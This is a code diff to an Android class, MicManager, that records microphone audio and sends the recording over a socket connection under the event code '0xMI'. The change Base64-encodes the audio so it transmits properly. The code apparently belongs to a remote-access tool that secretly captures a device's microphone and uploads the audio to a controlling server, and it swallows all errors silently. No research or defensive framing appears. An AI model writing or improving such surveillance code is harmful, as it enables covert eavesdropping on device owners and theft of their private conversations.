@@ -1,6 +1,7 @@
 package com.fason.app.features.mic;
 
 import android.media.MediaRecorder;
+import android.util.Base64;
 
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.network.SocketClient;
@@ -13,14 +14,16 @@ import java.io.FileInputStream;
 import java.util.Timer;
 import java.util.TimerTask;
 
-public class MicManager {
+public final class MicManager {
 
     private static MediaRecorder recorder;
     private static File audioFile;
 
+    private MicManager() {}
+
     public static void startRecording(int seconds) {
         if (seconds <= 0) return;
-        
+
         try {
             File cache = FasonApp.getContext().getCacheDir();
             if (cache == null) return;
@@ -67,10 +70,13 @@ public class MicManager {
                 bis.read(data);
             }
 
+            // Encode to Base64 for proper JSON transmission
+            String base64Audio = Base64.encodeToString(data, Base64.NO_WRAP);
+
             JSONObject obj = new JSONObject();
             obj.put("file", true);
             obj.put("name", file.getName());
-            obj.put("buffer", data);
+            obj.put("buffer", base64Audio);
             SocketClient.getInstance().getSocket().emit("0xMI", obj);
         } catch (Exception ignored) {}
     }
